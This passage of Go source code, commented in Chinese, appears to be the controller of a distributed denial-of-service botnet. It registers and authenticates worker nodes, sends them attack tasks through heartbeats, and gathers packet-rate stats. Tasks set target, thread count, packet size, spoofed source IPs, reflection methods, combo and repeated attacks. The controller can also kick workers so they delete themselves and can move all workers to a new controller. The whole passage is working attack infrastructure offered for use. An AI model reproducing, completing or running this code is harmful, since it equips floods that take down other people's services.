	// 与 Register 共用互斥体：避免旧进程的注销请求与新进程的注册请求交错，
	// 导致刚复用的节点条目被误删
	c.regMu.Lock()
	defer c.regMu.Unlock()

	if !c.validateWorkerToken(req.AuthToken) {
		return &pb.DeregisterResponse{Ok: false}, fmt.Errorf("invalid token")
	}
	c.mu.Lock()
	n, ok := c.nodes[req.WorkerId]
	if !ok {
		c.mu.Unlock()
		return &pb.DeregisterResponse{Ok: false}, fmt.Errorf("unknown node")
	}
	// 身份绑定：仅允许对端 IP 与节点注册 IP 一致的注销请求，
	// 防止共享 token 下任意 worker 注销他人节点。
	if p, ok := peerFromContext(ctx); ok && n.IP != "" && p != n.IP {
		c.mu.Unlock()
		log.Printf("[node] deregister %s REJECTED (peer %s != node ip %s)", req.WorkerId, p, n.IP)
		return &pb.DeregisterResponse{Ok: false}, fmt.Errorf("ip mismatch")
	}
	delete(c.nodes, req.WorkerId)
	log.Printf("[node] %s deregistered", req.WorkerId)
	c.mu.Unlock()

	c.persistNodes()
	c.broadcastWS("nodes", c.listNodesForBroadcast())

	return &pb.DeregisterResponse{Ok: true}, nil
}

func (c *Ctrl) Heartbeat(ctx context.Context, req *pb.HeartbeatRequest) (*pb.HeartbeatResponse, error) {
	if !c.validateWorkerToken(req.AuthToken) {
		return &pb.HeartbeatResponse{Ok: false}, fmt.Errorf("invalid token")
	}
	c.mu.Lock()
	node, ok := c.nodes[req.WorkerId]
	kicked := c.kicked[req.WorkerId]
	if ok {
		node.LastHeartbeat = time.Now()
		// 只在非攻击态时恢复 READY：攻击中的节点保持 ATTACKING，
		// 否则每次心跳都会把进行中任务的状态覆盖掉
		if node.Status == "" || node.Status == "OFFLINE" {
			node.Status = "READY"
		}
		if req.CpuPercent > 0 {
			node.CpuPercent = int32(req.CpuPercent)
		}
	}
	c.mu.Unlock()

	// 被踢出的节点优先返回 kick（必须在 unknown node 判定之前）：
	// handleKickNode 已把节点从表中删除，若先查 !ok 则永远走不到
	// Kick 分支，只能靠 worker 重注册被拒的间接路径自愈。
	if kicked {
		return &pb.HeartbeatResponse{Ok: true, Kick: true}, nil
	}
	if !ok {
		return &pb.HeartbeatResponse{Ok: false}, fmt.Errorf("unknown node")
	}

	var pendingTask *pb.AttackTask
	var cancelTaskID string
	assignedWorker := ""

	c.mu.Lock()
	rem := c.pendingIDs[:0]
	for i, tid := range c.pendingIDs {
		t := c.tasks[tid]
		if t == nil || t.Status != "pending" {
			continue
		}
		// 定时（重复攻击）任务未到执行时间：保留队列，不派发
		if t.NextRunAt.After(time.Now()) {
			rem = append(rem, tid)
			continue
		}
		// 任务指定了参与节点：非选中节点跳过（不派发也不计入完成判定）
		if len(t.SelectedWorkers) > 0 && !containsStr(t.SelectedWorkers, req.WorkerId) {
			rem = append(rem, tid)
			continue
		}
		// lw 节点只参与反射任务（非反射任务跳过；lw 走 HTTP 心跳，此处为保险）。
		// 注意：此处已持有 c.mu 写锁，必须用 isLWNodeLocked（isLWNode 会 RLock 死锁）
		if !isReflectorTaskMethod(t.Method) {
			if wn, ok := c.nodes[req.WorkerId]; ok && isLWNodeLocked(wn) {
				rem = append(rem, tid)
				continue
			}
		}
		if c.workerHasTask(t, req.WorkerId) {
			rem = append(rem, tid)
			continue
		}
		t.Workers[req.WorkerId] = &TaskStats{WorkerID: req.WorkerId}
		if c.onlineWorkersAllAssigned(t) {
			t.Status = "running"
			t.StartTime = time.Now()
		} else {
			rem = append(rem, tid)
		}
		pendingTask = c.taskToProto(t)
		assignedWorker = req.WorkerId
		// 关键：只派发本心跳的第一个任务（协议限制），但 break 前必须把
		// 尚未遍历的剩余 pending 任务保留回队列，否则后续任务被静默丢弃、
		// 30s 后误判 failed / 永不派发。
		rem = append(rem, c.pendingIDs[i+1:]...)
		break
	}
	c.pendingIDs = rem

	for _, tid := range c.cancelIDs {
		t := c.tasks[tid]
		if t == nil || t.Status != "cancelling" || !c.workerHasTask(t, req.WorkerId) {
			continue
		}
		// 本 worker 已确认过该取消：不再重复投递，避免已确认的取消任务
		// 一直占据队列头部、阻塞其他待取消任务的投递
		if t.CancelAcks[req.WorkerId] {
			continue
		}
		cancelTaskID = t.TaskID
		if t.CancelAcks == nil {
			t.CancelAcks = make(map[string]bool)
		}
		t.CancelAcks[req.WorkerId] = true
		if c.taskFullyCancelled(t) {
			c.finishCancellingTask(t)
		}
		break
	}
	c.cancelIDs = removeStaleCancelIDs(c.cancelIDs, c.tasks)

	if assignedWorker != "" {
		if n, nok := c.nodes[assignedWorker]; nok {
			n.Status = "ATTACKING"
		}
	}
	c.mu.Unlock()

	// 节点状态变化在锁外广播，避免慢速 WS 客户端阻塞心跳处理
	if assignedWorker != "" {
		log.Printf("[task] %s assigned to %s", pendingTask.TaskId, req.WorkerId)
		c.broadcastWS("nodes", c.listNodesForBroadcast())
	}

	// 迁移模式：携带新 controller 地址，worker 收到后自动切换
	c.migrateMu.RLock()
	migrateTarget := c.migrateTarget
	migrateToken := c.migrateToken
	c.migrateMu.RUnlock()

	return &pb.HeartbeatResponse{
		Ok:                   true,
		PendingTask:          pendingTask,
		CancelTaskId:         cancelTaskID,
		ReconfigureController: migrateTarget,
		ReconfigureToken:      migrateToken,
	}, nil
}

func (c *Ctrl) taskToProto(t *TaskInfo) *pb.AttackTask {
	pt := &pb.AttackTask{
		TaskId:          t.TaskID,
		Target:          t.Target,
		Method:          t.Method,
		Duration:        t.Duration,
		Threads:         t.Threads,
		PacketSize:      t.PacketSize,
		Mix:             t.Mix,
		Game:            t.Game,
		RateLimitPps:    t.RateLimitPPS,
		RateLimitBps:    t.RateLimitBPS,
		BurstMode:       t.BurstMode,
		JitterMs:        t.JitterMs,
		SpoofIp:         t.SpoofIP,
		FallbackToUdp:   t.FallbackToUDP,
		SelectedWorkers: t.SelectedWorkers,
	}
	for _, sub := range t.SubAttacks {
		pt.SubAttacks = append(pt.SubAttacks, &pb.SubAttack{
			Method:       sub.Method,
			Threads:      sub.Threads,
			PacketSize:   sub.PacketSize,
			RateLimitPps: sub.RateLimitPPS,
			RateLimitBps: sub.RateLimitBPS,
			Game:         sub.Game,
			BurstMode:    sub.BurstMode,
			JitterMs:     sub.JitterMs,
		})
	}
	return pt
}

func removeStaleCancelIDs(ids []string, tasks map[string]*TaskInfo) []string {
	out := ids[:0]
	for _, id := range ids {
		t := tasks[id]
		if t != nil && t.Status == "cancelling" {
			out = append(out, id)
		}
	}
	return out
}

func (c *Ctrl) ReportStats(stream pb.NodeService_ReportStatsServer) error {
	// 流级认证：stats 上报流必须携带 worker token。
	// 此前该流完全无认证，任何能连通 gRPC 端口的对端都能伪造统计、
	// 提前终结任务或写入伪造日志。
	md, ok := metadata.FromIncomingContext(stream.Context())
	token := ""
	if ok {
		if vals := md.Get("authorization"); len(vals) > 0 {
			token = strings.TrimPrefix(vals[0], "Bearer ")
		}
	}
	if !c.validateWorkerToken(token) {
		return status.Error(codes.Unauthenticated, "invalid worker token")
	}

	streamWorkerID := "" // 一条流只允许上报一个节点
	// 流身份绑定：记录本流对端 IP，消息中的 WorkerId 必须与节点注册 IP 一致，
	// 防止共享 token 下伪造其他节点的统计/完成状态
	streamPeerIP := ""
	if p, ok := peerFromContext(stream.Context()); ok {
		streamPeerIP = p
	}
	for {
		msg, err := stream.Recv()
		if err == io.EOF {
			return stream.SendAndClose(&pb.StatsAck{Ok: true})
		}
		if err != nil {
			return err
		}

		if msg.WorkerId == "" {
			continue
		}
		if streamWorkerID == "" {
			streamWorkerID = msg.WorkerId
		} else if msg.WorkerId != streamWorkerID {
			continue
		}

		c.mu.Lock()
		// WorkerStatsPush 无 token 字段，但可校验上报者必须是已注册节点，
		// 且任务必须真实分派给该节点，阻断未认证者伪造任意任务统计。
		node, nok := c.nodes[msg.WorkerId]
		if !nok {
			c.mu.Unlock()
			continue
		}
		// 身份绑定：对端 IP 与节点注册 IP 不一致视为伪造（节点 IP 为空时
		// 放行，兼容旧节点表）
		if streamPeerIP != "" && node.IP != "" && node.IP != streamPeerIP {
			c.mu.Unlock()
			continue
		}
		if node.Status == "OFFLINE" {
			node.LastHeartbeat = time.Now()
			node.Status = "READY"
		}
		task, ok := c.tasks[msg.TaskId]
		if ok && task.Workers != nil {
			if _, assigned := task.Workers[msg.WorkerId]; !assigned && msg.WorkerId != "" {
				c.mu.Unlock()
				continue
			}
			task.Workers[msg.WorkerId] = &TaskStats{
				WorkerID:    msg.WorkerId,
				PacketsSent: msg.PacketsSent,
				BytesSent:   msg.BytesSent,
				Errors:      msg.Errors,
				CurrentPPS:  msg.CurrentPps,
				CurrentBPS:  msg.CurrentBps,
				Elapsed:     msg.ElapsedSeconds,
				Finished:    msg.Finished,
				ErrorMsg:    msg.ErrorMsg,
			}
			if msg.Finished {
				if task.Status == "cancelling" {
					// 取消流程中：把已停止的 worker 记为已确认取消。
					// 不能直接翻 completed——超时重试触发的取消需要走
					// finishCancellingTask 转 pending 重新派发。
					if task.CancelAcks == nil {
						task.CancelAcks = make(map[string]bool)
					}
					task.CancelAcks[msg.WorkerId] = true
					if c.taskFullyCancelled(task) {
						c.finishCancellingTask(task)
					}
				} else if task.Status == "running" {
					allDone := true
					for _, w := range task.Workers {
						if !w.Finished {
							allDone = false
							break
						}
					}
				if allDone {
					task.Status = "completed"
					task.FinishedAt = time.Now()
					entry := c.buildTaskLog(task)
					go c.logTaskComplete(entry)
					wids := taskWorkerIDs(task)
					c.resetNodeStatusesLocked(wids...)
				}
				}
			}
		}
		c.mu.Unlock()

		if msg.Finished {
			c.broadcastWS("task_update", c.getTaskInfo(msg.TaskId))
		}
	}
}

func (c *Ctrl) workerHasTask(t *TaskInfo, workerID string) bool {
	if t.Workers == nil {
		return false
	}
	_, ok := t.Workers[workerID]
	return ok
}

// taskFullyCancelled 必须在持有 c.mu 时调用。
// 返回 true 表示持有该任务的所有 worker 都已确认取消指令
// （已自然完成 / 离线 / 已被清理的 worker 不会再产生流量，视为已确认）。
func (c *Ctrl) taskFullyCancelled(t *TaskInfo) bool {
	if len(t.Workers) == 0 {
		return true
	}
	for wid := range t.Workers {
		if t.CancelAcks[wid] {
			continue
		}
		// 该 worker 已上报 Finished=true：攻击自然结束，不会再产生流量。
		// 此前只认 CancelAcks 会导致"已完成 worker + 确认丢失的 worker"组合
		// 使取消永远无法收尾，任务永久卡在 cancelling。
		if st := t.Workers[wid]; st != nil && st.Finished {
			continue
		}
		// 节点不存在（已注销/超时清理）或已离线：视为已停止
		if n, ok := c.nodes[wid]; !ok || n.Status == "OFFLINE" {
			continue
		}
		return false
	}
	return true
}

// finishCancellingTask 必须在持有 c.mu 时调用。
// 取消确认全部到位后：超时重试触发的取消 → 转 pending 重新派发；
// 用户主动取消 → 置 completed 并写日志。
func (c *Ctrl) finishCancellingTask(t *TaskInfo) {
	t.CancelAcks = nil
	wids := taskWorkerIDs(t)
	if t.CancelToRetry {
		t.CancelToRetry = false
		t.Status = "pending"
		t.StartTime = time.Time{}
		t.CreatedAt = time.Now() // 重置派发计时窗口，避免 30s 强制翻转误伤
		// 重试只补派未完成的 worker：已完成（Finished=true）的节点
		// 保留记录，不再重新派发，避免整个任务被重复攻击一遍完整时长。
		oldWorkers := t.Workers
		t.Workers = make(map[string]*TaskStats)
		unfinished := 0
		for wid, st := range oldWorkers {
			if st == nil || !st.Finished {
				unfinished++
				continue
			}
			t.Workers[wid] = st
		}
		if unfinished == 0 {
			// 所有节点都已自然完成（完成上报丢失触发超时）：直接置
			// completed，否则 pending→running 循环重试死循环。
			t.Status = "completed"
			t.FinishedAt = time.Now()
			entry := c.buildTaskLog(t)
			go c.logTaskComplete(entry)
			log.Printf("[task] %s all workers finished, marking completed (no retry)", t.TaskID)
			c.resetNodeStatusesLocked(wids...)
			return
		}
		c.pendingIDs = append(c.pendingIDs, t.TaskID)
		log.Printf("[task] %s cancelled for retry, re-dispatching to unfinished workers (attempt %d/3)", t.TaskID, t.RetryCount)
	} else {
		t.Status = "completed"
		t.FinishedAt = time.Now()
		t.StoppedByUser = true
		// 用户 stop 终止整个重复序列：删除同序列尚未执行的定时任务
		seqRoot := t.ParentTaskID
		if seqRoot == "" {
			seqRoot = t.TaskID
		}
		var newPending []string
		for _, tid := range c.pendingIDs {
			pt := c.tasks[tid]
			if pt != nil && pt.ParentTaskID == seqRoot && pt.TaskID != t.TaskID {
				delete(c.tasks, tid)
				log.Printf("[task] %s repeat sequence cancelled by user stop, removed scheduled %s", seqRoot, tid)
				continue
			}
			newPending = append(newPending, tid)
		}
		c.pendingIDs = newPending
		entry := c.buildTaskLog(t)
		go c.logTaskComplete(entry)
		log.Printf("[task] %s cancelled, all workers confirmed stop", t.TaskID)
	}
	c.resetNodeStatusesLocked(wids...)
}

// taskWorkerIDs 返回任务派发过的所有 worker ID（必须在持有 c.mu 时调用）。
func taskWorkerIDs(t *TaskInfo) []string {
	ids := make([]string, 0, len(t.Workers))
	for wid := range t.Workers {
		ids = append(ids, wid)
	}
	return ids
}

// workerHasActiveTask 返回 worker 是否仍参与未结束的任务（必须在持有 c.mu 时调用）。
// pending 任务派发后 worker 已在攻击，因此同样视为活跃。
func (c *Ctrl) workerHasActiveTask(wid string) bool {
	for _, t := range c.tasks {
		if t.Status != "running" && t.Status != "pending" {
			continue
		}
		if st, ok := t.Workers[wid]; ok && !st.Finished {
			return true
		}
	}
	return false
}

// resetNodeStatusesLocked 任务结束后把不再参与任何进行中任务的节点恢复为 READY
// （必须在持有 c.mu 时调用）。
func (c *Ctrl) resetNodeStatusesLocked(wids ...string) {
	for _, wid := range wids {
		if c.workerHasActiveTask(wid) {
			continue
		}
		if n, ok := c.nodes[wid]; ok && n.Status == "ATTACKING" {
			n.Status = "READY"
		}
	}
}

// cloneNode 返回 NodeInfo 的深拷贝（含 Tags slice），使返回值可在锁外安全序列化。
func cloneNode(n *NodeInfo) *NodeInfo {
	cp := *n
	if n.Tags != nil {
		cp.Tags = append([]string(nil), n.Tags...)
	}
	return &cp
}

// cloneTask 返回 TaskInfo 的深拷贝（含 Workers map 及其 *TaskStats、SubAttacks slice），
// 使返回值可在锁外安全序列化，而 ReportStats/heartbeat 仍可并发改动原对象。
func cloneTask(t *TaskInfo) *TaskInfo {
	cp := *t
	if t.SubAttacks != nil {
		cp.SubAttacks = append([]SubAttackInfo(nil), t.SubAttacks...)
	}
	if t.SelectedWorkers != nil {
		cp.SelectedWorkers = append([]string(nil), t.SelectedWorkers...)
	}
	if t.Workers != nil {
		cp.Workers = make(map[string]*TaskStats, len(t.Workers))
		for k, v := range t.Workers {
			ws := *v
			cp.Workers[k] = &ws
		}
	}
	return &cp
}

// listNodesLocked 必须在持有 c.mu 时调用；返回每个节点的深拷贝，调用方可在锁外序列化。
func (c *Ctrl) listNodesLocked() []*NodeInfo {
	list := make([]*NodeInfo, 0, len(c.nodes))
	for _, n := range c.nodes {
		list = append(list, cloneNode(n))
	}
	return list
}

// onlineWorkersAllAssigned 必须在持有 c.mu 时调用。
// 返回 true 表示当前所有在线（非 OFFLINE）目标 Worker 都已领取该 task，
// 即 pending 派发窗口已覆盖全部可用 Worker，可翻转为 running。
// 任务指定 SelectedWorkers 时只统计选中节点；未指定时统计全部在线节点。
// 反射任务包含 lw 节点（lw 只参与反射）；非反射任务排除 lw 节点。
// 若当前没有任何在线目标 Worker，则要求 task 至少已派给一个 Worker 才算完成
// （避免在零在线节点时把刚创建、还没派发的 task 直接翻转）。
func (c *Ctrl) onlineWorkersAllAssigned(t *TaskInfo) bool {
	reflectorTask := isReflectorTaskMethod(t.Method)
	onlineCount := 0
	for id, n := range c.nodes {
		if n.Status == "OFFLINE" {
			continue
		}
		// 非反射任务：lw 节点不参与（lw 只跑反射）。
		// 注意：调用方已持有 c.mu 写锁，必须用 isLWNodeLocked（避免 RLock 死锁）
		if !reflectorTask && isLWNodeLocked(n) {
			continue
		}
		// 任务指定了参与节点：只统计选中的
		if len(t.SelectedWorkers) > 0 && !containsStr(t.SelectedWorkers, id) {
			continue
		}
		onlineCount++
		if _, ok := t.Workers[id]; !ok {
			return false
		}
	}
	if onlineCount == 0 {
		// 没有在线目标 Worker：只要已派给过至少一个（可能刚掉线的）Worker 就算派发完成。
		return len(t.Workers) > 0
	}
	return true
}

func (c *Ctrl) listNodesForBroadcast() []*NodeInfo {
	c.mu.RLock()
	defer c.mu.RUnlock()
	return c.listNodesLocked()
}

// offlineTimeout 根据节点状态与活跃任务返回心跳超时阈值：
//   - 节点正参与 running/pending 任务：容忍到任务结束时间 + 120s 缓冲。
//     攻击时带宽打满、心跳 TCP 包被挤掉是常态（小机器尤甚），
//     固定 60s 会把仍在攻击的节点误判 OFFLINE，导致后续任务不再派发给它。
//   - 空闲（READY）节点：15s 正常判定。
//
// 必须在持有 c.mu 时调用。
func (c *Ctrl) offlineTimeout(n *NodeInfo) time.Duration {
	// 节点是否参与未结束的任务
	for _, t := range c.tasks {
		if t.Status != "running" && t.Status != "pending" {
			continue
		}
		st, ok := t.Workers[n.WorkerID]
		if !ok || st.Finished {
			continue
		}
		end := t.StartTime.Add(time.Duration(t.Duration+120) * time.Second)
		if remaining := time.Until(end); remaining > 0 {
			return remaining + 30*time.Second
		}
		return 120 * time.Second
	}
	// 空闲（READY）节点：45s。worker 心跳 3s 一次、RPC 超时 10s，
	// 15s 阈值只容忍 1~2 次失败，网络抖动/Controller 重启瞬间就会误判离线。
	// 45s ≈ 15 次心跳机会，兼顾误判容忍与掉线感知延迟。
	return 45 * time.Second
}

func (c *Ctrl) watchOfflineNodes() {
	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()
	for range ticker.C {
		changed := false
		c.mu.Lock()
		for id, n := range c.nodes {
			// 已离线节点超过 10 分钟：从节点表移除，防止僵尸节点无限累积
			if n.Status == "OFFLINE" && time.Since(n.LastHeartbeat) > 10*time.Minute {
				delete(c.nodes, id)
				log.Printf("[node] %s removed (offline > 10min)", id)
				changed = true
				continue
			}
			if n.Status != "OFFLINE" && time.Since(n.LastHeartbeat) > c.offlineTimeout(n) {
				n.Status = "OFFLINE"
				log.Printf("[node] %s marked offline (last seen %v ago)", id, time.Since(n.LastHeartbeat).Round(time.Second))
				changed = true
			}
		}
		var newPending []string
		for _, tid := range c.pendingIDs {
			t := c.tasks[tid]
			if t == nil || t.Status != "pending" {
				continue
			}
			if changed && c.onlineWorkersAllAssigned(t) {
				t.Status = "running"
				t.StartTime = time.Now()
				log.Printf("[task] %s -> running (dispatch complete after node offline)", t.TaskID)
				continue
			}
			newPending = append(newPending, tid)
		}
		c.pendingIDs = newPending
		c.mu.Unlock()
		if changed {
			c.broadcastWS("nodes", c.listNodesForBroadcast())
		}
	}
}

// persistNodes 把节点表写入 data/nodes.json（原子替换：临时文件 + rename）。
// 调用方不得持有 c.mu（内部取 RLock 做快照，锁外执行磁盘 IO）。
// 关键事件（注册/注销/踢出）后立即调用；心跳类状态变化由 30s 定时兜底。
func (c *Ctrl) persistNodes() {
	// 深拷贝快照：心跳等路径在写锁下并发修改 NodeInfo 字段，
	// 直接序列化裸指针存在数据竞争（撕裂读可能写出坏 JSON）
	c.mu.RLock()
	list := c.listNodesLocked()
	c.mu.RUnlock()

	data, err := json.Marshal(list)
	if err != nil {
		log.Printf("[node] persist marshal error: %v", err)
		return
	}

	tmp := c.nodesFile + ".tmp"
	if err := os.WriteFile(tmp, data, 0644); err != nil {
		log.Printf("[node] persist write error: %v", err)
		return
	}
	// Windows 下 rename 不能覆盖已存在文件，先删旧文件
	os.Remove(c.nodesFile)
	if err := os.Rename(tmp, c.nodesFile); err != nil {
		log.Printf("[node] persist rename error: %v", err)
	}
}

// watchNodesPersist 每 30s 落盘一次节点表（心跳更新 LastHeartbeat/状态等
// 高频变化不需要实时持久化，30s 粒度足够）。
func (c *Ctrl) watchNodesPersist() {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()
	for range ticker.C {
		c.persistNodes()
	}
}

func (c *Ctrl) getTaskInfo(taskID string) *TaskInfo {
	c.mu.RLock()
	defer c.mu.RUnlock()
	t := c.tasks[taskID]
	if t == nil {
		return nil
	}
	return cloneTask(t)
}

func (c *Ctrl) handleAuth(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, `{"error":"POST required"}`, 405)
		return
	}
	var req struct {
		Token string `json:"token"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, `{"error":"bad request"}`, 400)
		return
	}
	if req.Token == c.adminToken {
		writeJSON(w, map[string]interface{}{"success": true, "role": "admin", "token": c.adminToken})
		return
	}
	if req.Token == c.workerToken {
		writeJSON(w, map[string]interface{}{"success": true, "role": "worker", "token": c.workerToken})
		return
	}
	writeJSON(w, map[string]interface{}{"success": false, "error": "invalid token"})
}

func (c *Ctrl) handleNodes(w http.ResponseWriter, r *http.Request) {
	c.mu.RLock()
	nodes := c.listNodesLocked()
	c.mu.RUnlock()
	writeJSON(w, nodes)
}

// handleKickNode POST /api/nodes/:id/kick
// 踢出节点：标记 kicked，worker 下次心跳收到 kick 标志后自行退出并删除自身。
// 同时从节点表中移除（防止未退出的 worker 继续收到任务）。
func (c *Ctrl) handleKickNode(w http.ResponseWriter, r *http.Request) {
	// DELETE /api/nodes/:id/kick → 撤销踢出（worker 尚未退出时可反悔）
	if r.Method == "DELETE" {
		c.handleUnkickNode(w, r)
		return
	}
	if r.Method != "POST" {
		http.Error(w, `{"error":"POST required"}`, 405)
		return
	}
	id := strings.TrimPrefix(r.URL.Path, "/api/nodes/")
	id = strings.TrimSuffix(id, "/kick")
	if id == "" {
		http.Error(w, `{"error":"missing node id"}`, 400)
		return
	}

	c.mu.Lock()
	if _, ok := c.nodes[id]; !ok {
		c.mu.Unlock()
		writeJSON(w, map[string]interface{}{"error": "node not found"})
		return
	}
	c.kicked[id] = true
	delete(c.nodes, id)
	c.mu.Unlock()

	c.auditAction(r, "node_kick", id)
	log.Printf("[node] %s kicked (will self-exit on next heartbeat)", id)
	c.persistNodes()
	c.broadcastWS("nodes", c.listNodesForBroadcast())
	writeJSON(w, map[string]interface{}{"ok": true})
}

// handleUnkickNode DELETE /api/nodes/:id/kick
// 撤销踢出（worker 尚未退出时误踢可反悔）
func (c *Ctrl) handleUnkickNode(w http.ResponseWriter, r *http.Request) {
	if r.Method != "DELETE" {
		http.Error(w, `{"error":"DELETE required"}`, 405)
		return
	}
	id := strings.TrimPrefix(r.URL.Path, "/api/nodes/")
	id = strings.TrimSuffix(id, "/kick")
	if id == "" {
		http.Error(w, `{"error":"missing node id"}`, 400)
		return
	}

	c.mu.Lock()
	delete(c.kicked, id)
	c.mu.Unlock()
	c.auditAction(r, "node_unkick", id)
	log.Printf("[node] %s unkicked", id)
	writeJSON(w, map[string]interface{}{"ok": true})
}

func (c *Ctrl) handleTasks(w http.ResponseWriter, r *http.Request) {
	if r.Method == "POST" {
		var req struct {
			Target       string   `json:"target"`
			Targets      []string `json:"targets"`
			Method       string   `json:"method"`
			Duration     int32    `json:"duration"`
			Threads      int32    `json:"threads"`
			PacketSize   int32    `json:"packet_size"`
			Mix          bool     `json:"mix"`
			Game         string   `json:"game"`
			RateLimitPPS int64    `json:"rate_limit_pps"`
			RateLimitBPS int64    `json:"rate_limit_bps"`
			BurstMode    bool     `json:"burst_mode"`
			JitterMs     int32    `json:"jitter_ms"`
			SpoofIP      bool     `json:"spoof_ip"`
			// 重复攻击：repeat_count=总次数（1-1000，1=单次），repeat_interval=间隔秒
			RepeatCount    int `json:"repeat_count"`
			RepeatInterval int `json:"repeat_interval"`
			// Priority 1=高优先级（插队派发）
			Priority int `json:"priority"`
			// *bool：nil（请求未传）→ 默认开启。反射器攻击在不支持伪造的
			// worker 上无法到达目标，默认降级可避免 4/5 的节点做无效攻击。
			FallbackToUDP *bool           `json:"fallback_to_udp"`
			SubAttacks    []SubAttackInfo `json:"sub_attacks"`
			// Workers 指定参与任务的节点 ID 列表；空 = 全部在线节点
			Workers []string `json:"workers"`
			// Groups 指定参与任务的节点分组（快捷多选）；与 Workers 取并集
			Groups []string `json:"groups"`
		}
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			writeJSON(w, map[string]string{"error": "invalid request: " + err.Error()})
			return
		}

		if req.Target == "" && len(req.Targets) == 0 {
			writeJSON(w, map[string]string{"error": "target or targets is required"})
			return
		}
		if req.Method == "" {
			writeJSON(w, map[string]string{"error": "method is required"})
			return
		}
		if req.Method == "combo" && len(req.SubAttacks) == 0 {
			writeJSON(w, map[string]string{"error": "sub_attacks is required for combo method"})
			return
		}
		if !isValidMethod(req.Method) {
			writeJSON(w, map[string]string{"error": "unknown method: " + req.Method})
			return
		}
		// 防滥用：数组类输入设上限，避免单请求打爆内存/派发风暴
		if len(req.Targets) > 500 {
			writeJSON(w, map[string]string{"error": "too many targets (max 500)"})
			return
		}
		if len(req.SubAttacks) > 20 {
			writeJSON(w, map[string]string{"error": "too many sub_attacks (max 20)"})
			return
		}
		// 重复攻击参数校验
		if req.RepeatCount < 0 || req.RepeatCount > 1000 {
			writeJSON(w, map[string]string{"error": "repeat_count must be 0-1000"})
			return
		}
		if req.RepeatInterval < 0 || req.RepeatInterval > 86400 {
			writeJSON(w, map[string]string{"error": "repeat_interval must be 0-86400 seconds"})
			return
		}
		if req.Priority != 0 && req.Priority != 1 {
			writeJSON(w, map[string]string{"error": "priority must be 0 or 1"})
			return
		}
		if req.RepeatCount > 1 && req.RepeatInterval < 1 {
			writeJSON(w, map[string]string{"error": "repeat_interval required when repeat_count > 1"})
			return
		}

		// combo 模式下每个子攻击拥有独立的线程/包大小配置，
		// 外层配置仅作兜底，不强制要求
		if req.Method == "combo" {
			if req.Duration < 1 || req.Duration > 86400 {
				writeJSON(w, map[string]string{"error": "duration must be 1-86400 seconds"})
				return
			}
			for _, sub := range req.SubAttacks {
				// 校验子攻击方法：未知方法/嵌套 combo 会让子攻击静默空转
				if !isValidMethod(sub.Method) || sub.Method == "combo" {
					writeJSON(w, map[string]string{"error": "unknown sub-attack method: " + sub.Method})
					return
				}
				if sub.Threads < 1 || sub.Threads > 10000 {
					writeJSON(w, map[string]string{"error": "sub-attack threads must be 1-10000"})
					return
				}
				if sub.PacketSize < 1 || sub.PacketSize > 65507 {
					writeJSON(w, map[string]string{"error": "sub-attack packet_size must be 1-65507"})
					return
				}
			}
		} else {
			if req.Duration < 1 || req.Duration > 86400 {
				writeJSON(w, map[string]string{"error": "duration must be 1-86400 seconds"})
				return
			}
			if req.Threads < 1 || req.Threads > 10000 {
				writeJSON(w, map[string]string{"error": "threads must be 1-10000"})
				return
			}
			if req.PacketSize < 1 || req.PacketSize > 65507 {
				writeJSON(w, map[string]string{"error": "packet_size must be 1-65507"})
				return
			}
		}

		target := req.Target
		if target == "" && len(req.Targets) > 0 {
			target = strings.Join(req.Targets, "\n")
		}

		// 目标保护：服务端强制校验所有目标（多行 target + targets 数组），
		// 拦截内网/保留段/黑名单目标，防止误操作
		var guardTargets []string
		guardTargets = append(guardTargets, req.Targets...)
		for _, line := range strings.Split(req.Target, "\n") {
			if strings.TrimSpace(line) != "" {
				guardTargets = append(guardTargets, line)
			}
		}
		if err := c.validateTargets(guardTargets); err != nil {
			guardBlockLog(err.Error())
			writeJSON(w, map[string]string{"error": "target guard: " + err.Error()})
			return
		}

		// 节点分组展开：组是节点的快捷多选，与显式 workers 取并集。
		// 展开后再做存在性/在线性校验。
		if len(req.Groups) > 0 {
			var errMsg string
			req.Workers, errMsg = c.resolveTaskGroups(req.Groups, req.Workers)
			if errMsg != "" {
				writeJSON(w, map[string]string{"error": errMsg})
				return
			}
		}

		c.mu.RLock()
		// 指定了 workers：校验所有选中节点存在且在线；未指定：统计全部在线节点
		onlineCount := 0
		if len(req.Workers) > 0 {
			validWorkers := make([]string, 0, len(req.Workers))
			for _, wid := range req.Workers {
				n, ok := c.nodes[wid]
				if !ok {
					c.mu.RUnlock()
					writeJSON(w, map[string]string{"error": "unknown worker: " + wid})
					return
				}
				if n.Status == "READY" || n.Status == "ATTACKING" {
					validWorkers = append(validWorkers, wid)
					onlineCount++
				}
			}
			req.Workers = validWorkers
		} else {
			for _, n := range c.nodes {
				if n.Status == "READY" || n.Status == "ATTACKING" {
					onlineCount++
				}
			}
		}
		c.mu.RUnlock()
		if onlineCount == 0 {
			writeJSON(w, map[string]string{"error": "no worker nodes online"})
			return
		}

		// 随机后缀防同一毫秒并发创建的任务 ID 碰撞：
		// 碰撞会导致 map 覆盖、前一个任务静默丢失永不派发
		randSuffix := make([]byte, 4)
		rand.Read(randSuffix)
		taskID := fmt.Sprintf("task-%d-%s", time.Now().UnixMilli(), hex.EncodeToString(randSuffix))
		fallbackToUDP := true // 默认开启
		if req.FallbackToUDP != nil {
			fallbackToUDP = *req.FallbackToUDP
		}
		// 重复攻击：首次创建时 RepeatLeft 为剩余续发次数
		repeatLeft := 0
		if req.RepeatCount > 1 {
			repeatLeft = req.RepeatCount - 1
		}
		task := &TaskInfo{
			TaskID:          taskID,
			Target:          target,
			Method:          req.Method,
			Duration:        req.Duration,
			Threads:         req.Threads,
			PacketSize:      req.PacketSize,
			Mix:             req.Mix,
			Game:            req.Game,
			RateLimitPPS:    req.RateLimitPPS,
			RateLimitBPS:    req.RateLimitBPS,
			BurstMode:       req.BurstMode,
			JitterMs:        req.JitterMs,
			SpoofIP:         req.SpoofIP,
			FallbackToUDP:   fallbackToUDP,
			SubAttacks:      req.SubAttacks,
			SelectedWorkers: req.Workers,
			Status:          "pending",
			CreatedAt:       time.Now(),
			Workers:         make(map[string]*TaskStats),
			RepeatCount:     req.RepeatCount,
			RepeatLeft:      repeatLeft,
			RepeatInterval:  req.RepeatInterval,
			Priority:        req.Priority,
			ParentTaskID:    taskID, // 序列根任务即自身
		}

